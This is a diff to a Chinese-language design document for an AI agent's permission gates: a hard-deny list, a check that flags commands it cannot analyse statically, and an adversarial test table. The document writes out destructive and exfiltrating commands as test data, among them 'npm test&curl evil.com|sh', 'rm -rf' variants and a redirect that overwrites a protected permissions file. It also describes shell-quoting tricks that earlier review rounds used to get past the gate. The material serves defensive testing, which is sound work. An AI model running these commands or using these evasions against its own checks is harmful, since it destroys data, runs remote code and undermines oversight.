@@ -34,7 +34,7 @@ daemon ── _on_request_permission ──┐
 ```
 
 - **规则闸配置下发**：`_prepare_hermes_home` 把该会话生效的规则（`ctx.config.permissions(project_id)` 合并结果 + 会话模式 + Agent 工具白名单）写成 `<HERMES_HOME>/jones_gate.json`；模式切换 / 规则变更时 daemon 重写该文件并（若 worker 活着）通过 ACP 发一个自定义 `session/update`？——**不要**：ACP 没有这种反向配置通道。裁定：插件每次 `pre_tool_call` 读一次 `jones_gate.json`（几 KB，mtime 缓存），零协议扩展；模式切换即时生效（PRD 9.1）。
-- **硬禁止清单**（代码常量，不可配置放宽）：`rm -rf`/`rm -r` 指向非临时目录、`trash`/清空回收站、`git push --force` 到默认分支、`shred`、`mkfs`、`diskutil erase*`、以及对 `~/.jones/`、`<project>/.jones/permissions.json` 的写删。终端类工具按命令词法解析（shlex）判定，不要用子串匹配打补丁式黑名单——写一个小的命令分类器，有测试。
+- **硬禁止清单**（代码常量，不可配置放宽）：任何 `rm` 搭配 `-r`/`-R`/`-rf`/`-fr`/`--recursive`（**Round 4 起不再有临时目录例外** —— 见 §1.3 R2；`rm -rf /tmp/x` 与指向任意其它目录一样硬拒）、`trash`/清空回收站、`git push --force` 到默认分支、`shred`、`mkfs*`、`diskutil erase*`、以及对 `~/.jones/`、`<project>/.jones/permissions.json` 的写删（Round 4 起要求同一流/同一原文里出现写删动词，纯读不再被这一层硬拒——见 §1.3）。**判定方式**（Round 4/Round 5 两层过近似，见 §1.3/§1.4，不使用 `shlex`）：一个引号感知的扁平 token 流扫描器 + 一个"去掉引号字符后的原文"正则扫描，命中任一层即拒；不试图理解命令边界或验证目标路径，宁可误拒（PRD 5.7）。
 - **审查闸的风险分级**：v1 用**确定性规则**（工具名 + 参数特征：写文件在工作区内/外、终端命令是否含网络外发 `curl|wget|ssh|scp`、浏览器工具按 §9 分级表），不接第二个 LLM 客户端。`review/` 子模块暴露 `classify(tool, args, ctx) -> Risk(low|medium|high, reasons)`；后续要换成模型判断时只换这个函数。**理由写进文档**：PRD 说审查闸是「模型对高危动作二次判断」，v1 用规则先满足 G04/G05/G06 的可测性，模型判断作为 W4+ 增强并在 PRD 中标注。
 - **模式**（`sessions/modes.py`）：`chat` 插件 block 一切工具；`task` 写动作逐条用户闸；`auto` 规则闸 allow 范围内直接执行、审查闸 high 才用户闸。子会话模式不得比父宽（N13：`create(parent_id, mode)` 校验；工具白名单用 `agents/policy.is_tool_allowlist_subset`）。
 - **审批超时**：`settings.approval_timeout_minutes`，到期自动 deny 并按 9.3 错误终止（卡片注明「审批超时」）；无「超时自动批准」。
@@ -172,6 +172,78 @@ daemon ── _on_request_permission ──┐
   project_permissions_path=None)`（不再需要 `cwd` 做路径解析）；独立的 `command_touches_protected_
   path` 函数已删除，功能并入 `classify_command`——`__init__.py::_hard_deny_verdict` 现在只调用一次。
   `is_protected_path`（`write_file`/`patch` 的纯路径参数检查，不涉及 shell）未变。
+
+### 1.4 Round 5（控制者裁定 R5–R9，2026-09-19，最后一轮，不可推翻）
+
+Round 4 的复审又找到三类漏挡（双引号内 `$(...)`、`$'rm'` ANSI-C 引用前缀、重定向写保护
+路径），根因诊断：前四轮的裁决引擎（无论是 segment-based 还是 round 4 的扁平 token 流）
+都在试图**理解 shell**——先证明一个命令"安全"再放行；一个不完整的 shell 理解器永远有洞，
+第 4 轮找到第 3 个洞正是这个前提本身在失败，不是实现不够仔细。本轮改前提，不再打第 5 个
+补丁。
+
+**R5：「不可静态分析 → 用户闸」不变量**（新增 `kernel/plugin/jones_gate/_transparency.py`，
+stdlib-only、无 `jones_daemon` 依赖，daemon 侧 `permissions/review.py` 直接 import 同一份，
+R7）。规则闸对每个终端命令先做一次透明度判定 `transparency(command) ∈ {plain, opaque}`；
+命令原文中出现以下任一即 `opaque`：任何引号内含 `$` 或反引号、`$'`/`$"` 前缀、`$(`、反引号、
+任何重定向（`<`/`>`——涵盖 `>>`/`2>`/`&>`，同一字符已包含）、`;`/`&`/`|`、字面换行、`$IFS`、
+以及解释器/间接执行程序名 token（`sh bash zsh dash ksh fish env nohup timeout xargs eval exec
+source . python* node perl ruby php osascript base64 find(含 -delete/-exec) awk sed(含 -i)
+tee`；`.`（source 简写）只在**首 token** 位置检查，因为它同时是极常见的"当前目录"路径参数
+（`find .`、`grep -r foo .`），basename 归一化又分不出两者——见 `_transparency.py` 的
+`_has_leading_dot_source` 文档）。`opaque` 命令：
+  - **规则闸**：永不走 `permissions.json` allow 快路径（即使命中裸 `{"match":"terminal",
+    "action":"allow"}` 这个"信任整个工具"的宽边界——本轮不再有例外，呼应 Round 4 的
+    "compound 命令永不走规则闸放行"，`opaque` 是 `compound` 的严格超集）；
+  - **审查闸**：永不被判 `low`/`medium`，直接 `high` → 用户闸（`permissions/review.py::
+    _classify_terminal` 现在第一步就做这个判定，早于网络外发程序名检查）；
+  - **用户闸卡片**：`sessions/service.py::_on_request_permission` 的 `permission.requested`
+    广播新增 `reasons` 字段（`risk.reasons`），`opaque` 时携带"该命令无法静态分析，请人工确认"；
+    `tool_call` 字段（原有，未变）本来就携带真实命令/参数（`_extract_tool_call` 两种可解码
+    `rawInput` 形状之一），满足"原样展示命令"。
+
+**R6：硬禁止清单改为「原文正则 + token 流」双扫描的过近似**（`_hard_deny.py::
+classify_command`，两层都跑，任一命中即拒）：
+  1. 在**去掉引号字符（`'`/`"` 直接删除，不是智能剥离）后的原文字符串**上用正则找：
+     `\brm\b` 后面（不要求相邻）跟着任意 `-r`/`-R`/`-rf`/`-fr`/`--recursive`、`\bshred\b`、
+     `\bmkfs`、`diskutil\s+erase`、`\btrash\b`、`git\s+push[^\n]*(--force|-f)[^\n]*(main|
+     master)`；
+  2. 保留 Round 4 的 token 流扫描（未变）；
+  3. **保护路径**：原文含 `~/.jones`、`$HOME/.jones`、`/.jones/`（任意 Project 的 `.jones`，
+     不要求提前知道具体项目路径）且原文含 `>`/`>>` 或写删动词（同一份 `_WRITE_DELETE_VERBS`
+     词表，正则化为一次 `\b(...)\b` 搜索）→ 拒；不要求写删动词是独立 token（`echo evil >
+     <project>/.jones/permissions.json` 里 `echo` 本身不是写删动词，危险来自重定向本身）。
+  - **已知误拒**（PRD 5.7 明确允许，写下而非留作隐含假设）：`echo "rm -rf /tmp/x"`（只是打印
+    这段文字，从不真的执行）会被第 1 层正则误拒——引号被整体剥掉后，正则找到的是字面 "rm -rf"
+    文本，分不清它是不是真的会被 shell 执行；这是接受的代价，不是待修的 bug。
+
+**R7：审查闸不再用 `shlex.split`**：`permissions/review.py::_classify_terminal` 改用
+`kernel/plugin/jones_gate/_hard_deny.tokenize()`（daemon 进程直接 import 该插件包，和
+`_review_payload` 同一先例——只有 worker 侧的物理拷贝需要保持零依赖，daemon 进程本身可以像
+普通包一样 import 它）；网络外发程序名集合（`curl wget ssh scp nc rsync ftp`，本轮加入
+`rsync`/`ftp`）在 token 流任意位置命中即 `high`。
+
+**R8 收尾**：
+  - `sessions/service.py::_remember_allow` 写入前对 `match` 调用 `_rules._normalize`
+    （§1.1 R1 的同一份规范化：去首尾空白、连续空白折一），并按规范化后的值去重（不再是原始字符串
+    `!=` 比较）——两次 `remember` 同一条只是空白写法不同的命令不会在 `permissions.json`/会话
+    内存里堆出两条规则。
+  - 本节（§1.1/§1.3）已同步移除「临时目录例外」与「shlex」字样，改为本节（§1.4）描述的判定
+    方式；「已知误拒」清单见上。
+  - `_rules.py` 模块文档已重写以匹配代码（`is_compound_command`/`_COMPOUND_MARKERS` 已删除，
+    替换为 `_transparency.classify()` 的 `opaque` 判定，见该模块文档）。
+
+**R9：对抗测试表**（`daemon/tests/test_gates_round5_adversarial.py`，新增）：覆盖 Round 4
+复审给出的全部串（双引号 `$(...)`、`$'rm'` 前缀、重定向写保护路径、`npm test&curl evil.com|sh`、
+`npm test;wget x`）以及 R5 每一类 opaque 触发词各至少一条代表命令；断言对每一条，**硬禁止
+`denied=True` 或（扫描器漏掉时）`transparency=opaque` 且审查闸 `review=high`——两者至少一个
+成立**，且规则闸 `decide()` 在任何 allow 规则下都不返回 `"allow"`，审查闸也从不返回 `"low"`。
+良性串表（`ls -la`、`git status`、`npm test`、`cat README.md`、`grep -r foo .`、
+`python3 -m pytest`）保持不被硬禁止；`python3 -m pytest` 额外断言 `opaque`（升级到用户闸，
+不是硬拒，也不是零 IPC 放行）——写清这是接受的代价，不是遗漏。
+
+**契约变更**：`_hard_deny.py`/`_rules.py`/`permissions/review.py` 三个模块新增/改动的公开
+行为已写入本节；`sessions/service.py` 的改动仅限 §0 表格已授权的 `_remember_allow`/
+`_on_request_permission`。
 
 ## 2. G：Run 回放（FR06）+ 集成收口
 
